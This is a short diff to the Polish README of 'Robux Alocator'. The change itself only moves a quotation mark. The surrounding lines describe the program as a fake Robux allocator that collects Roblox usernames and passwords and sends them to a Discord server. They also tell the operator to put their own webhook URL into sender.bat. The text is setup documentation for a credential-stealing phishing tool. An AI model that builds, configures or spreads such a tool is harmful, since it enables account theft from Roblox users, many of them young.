@@ -7,7 +7,7 @@ Działanie programu:
 Robux Alocator pyta użytkownika o podanie danych do logowania do konta Roblox i ilość robuxów, po czym wysyła nazwę użytkownika i hasło na wybrany serwer Discord.
 
 
-Jak "skompilować?"
+Jak "skompilować"?
 
 Edytuj plik zatytułowany sender.bat i wyszukaj ciąg znaków - urdiscordwebhookurl.
 
